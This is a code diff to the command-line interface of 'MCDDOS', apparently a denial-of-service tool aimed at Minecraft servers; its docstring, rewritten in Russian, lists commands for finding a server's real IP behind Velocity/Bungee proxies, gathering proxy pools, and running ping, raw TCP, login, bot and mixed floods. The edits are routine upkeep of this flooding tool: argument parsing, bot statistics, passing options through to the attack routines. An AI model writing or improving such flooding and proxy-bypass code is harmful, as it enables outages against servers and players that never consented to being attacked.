@@ -1,14 +1,19 @@
-"""Command-line interface for MCDDOS.
+"""
+Интерфейс командной строки MCDDOS.
 
-Commands:
-  status   - quick ping, show version/motd/players
-  realip   - find real IP behind Velocity/Bungee
-  proxies  - fetch + verify proxy pool
-  ping     - status ping flood
-  tcp      - raw TCP connect flood
-  login    - full login flood
-  bot      - bot load (join + keepalive + chat)
-  mixed    - everything at once
+Команды:
+  status   - быстрый пинг, показать version/motd/players
+  realip   - найти реальный IP за Velocity/Bungee
+  proxies  - скачать и проверить пул прокси
+  ping     - флуд status-пингом
+  tcp      - флуд сырых TCP-соединений
+  login    - флуд полных логинов
+  bot      - нагрузка ботами (вход + keepalive + чат)
+  mixed    - всё сразу
+  versions - напечатать таблицу version -> protocol
+
+Примечание: `detect` и `playtest` — отдельные скрипты (detect.py в корне
+репозитория и tools/playtest.py), а не подкоманды этого CLI.
 """
 import argparse
 import asyncio
@@ -18,11 +23,10 @@ import sys
 import time
 
 from .versions import protocol_of, VERSIONS
-from .mcconn import MCConn, MCConnError
+from .mcconn import MCConn
 from . import realip as realip_mod
 from . import proxies as proxies_mod
 from . import ddos
-from . import bots as bots_mod
 
 
 def _parse_args():
@@ -63,7 +67,9 @@ def _parse_args():
     p.add_argument("--chat-every", type=float, default=8.0, help="seconds between bot chats")
     p.add_argument("--quiet", action="store_true")
     p.add_argument("--json", action="store_true", help="json output (status/realip)")
-    return p.parse_args()
+    # parse_intermixed_args: позволяет ставить флаги и после позиционных
+    # host/port (`mcddos status --json host`), а не только до них.
+    return p.parse_intermixed_args()
 
 
 def _load_proxies(specs):
@@ -90,7 +96,7 @@ def _pick_version(args, server_version=None):
     if args.version:
         return args.version
     if server_version:
-        # server status version looks like "1.20.4 (765)" or "1.20.4"
+        #  версия в status выглядит как "1.20.4 (765)" либо "1.20.4"
         try:
             name = server_version.split("(")[0].strip()
             protocol_of(name)
@@ -127,7 +133,7 @@ async def _cmd_status(args):
 
 async def _cmd_realip(args):
     version = _pick_version(args, None)
-    pvn = protocol_of(version) if not args.version or not args.version.isdigit() else int(args.version)
+    pvn = protocol_of(version)
 
     def log(msg):
         if not args.quiet:
@@ -186,7 +192,7 @@ async def _run_flood(args, mode):
             scan_subnet=not args.no_scan, scan_wide=args.wide_scan,
             log=(lambda m: None if args.quiet else print(m)))
         if found:
-            # pick the best backend: explicit match, then prelogin, then top score
+            #  выбираем лучший бэкенд: явное совпадение, затем prelogin, затем максимальный скор
             def rank(f):
                 if f.get("match"): return 1000
                 via = f.get("via", "")
@@ -203,7 +209,7 @@ async def _run_flood(args, mode):
             log(f"auto-backend: {args.host}:{args.port} -> {best['ip']}:{best['port']} "
                 f"(via {best.get('via')})")
             args.host, args.port = best["ip"], best["port"]
-            # re-resolve version to the backend's reported protocol if available
+            #  если бэкенд сообщил свой protocol — уточняйте версию по нему
             binfo = best.get("status") or {}
             bp = (binfo.get("version") or {}).get("protocol")
             if bp:
@@ -237,12 +243,15 @@ async def _run_flood(args, mode):
             dt = now - last[0]
             r = stats.ok / dt if dt > 0 else 0
             last[0] = now
-            if not args.quiet:
+            # в чистом bot-режиме счётчик ok/fail не используется —
+            # вместо него печатается строка статистики ботов (ниже в цикле)
+            if not args.quiet and mode != "bot":
                 print(f"  ok={stats.ok} fail={stats.fail} rate={r:.0f}/s "
                       f"up={int(now - t0)}s")
 
     pool = None
     rep = asyncio.create_task(reporter())
+    pstats = None  # статистика пула ботов (для bot/mixed)
     try:
         if mode == "ping":
             await ddos.ping_ddos(args.host, args.port, version, workers=args.workers,
@@ -259,7 +268,8 @@ async def _run_flood(args, mode):
             pool = await ddos.mixed_ddos(args.host, args.port, version,
                                          workers=args.workers, bot_count=args.bott,
                                          stop=lambda: stop["flag"], stats=stats, log=log,
-                                         signed=args.signed, share_key=args.share_key)
+                                         signed=args.signed, share_key=args.share_key,
+                                         chat_every=args.chat_every)
         elif mode == "bot":
             pool = ddos.bot_load(args.host, args.port, version, count=args.bott,
                                  proxy=proxies if proxies else None,
@@ -273,9 +283,16 @@ async def _run_flood(args, mode):
                     print(f"  bots={s['total']} joined={s['joined']} kicks={s['kicks']} chats={s['chats']}")
     finally:
         rep.cancel()
+        # счётчики снимаем ПОСЛЕ остановки пула: боты успевают дослать
+        # последний чат/кик, и статистика будет полной
         if pool:
             await pool.stop_all()
-    log(f"done: ok={stats.ok} fail={stats.fail} in {int(time.time() - t0)}s")
+        pstats = pool.stats() if pool is not None else None
+    tail = ""
+    if pstats:
+        tail = (f" | bots={pstats['total']} joined={pstats['joined']} "
+                f"kicks={pstats['kicks']} chats={pstats['chats']}")
+    log(f"done: ok={stats.ok} fail={stats.fail}{tail} in {int(time.time() - t0)}s")
     return 0
 
 
@@ -286,7 +303,8 @@ async def main(argv=None):
             print(f"{k:8} {v}")
         return 0
     if not args.host:
-        print("need host for command " + args.command)
+        print(f"need host for command {args.command} "
+              f"(e.g. mcddos {args.command} play.example.com 25565)")
         return 2
     if args.command == "status":
         return await _cmd_status(args)
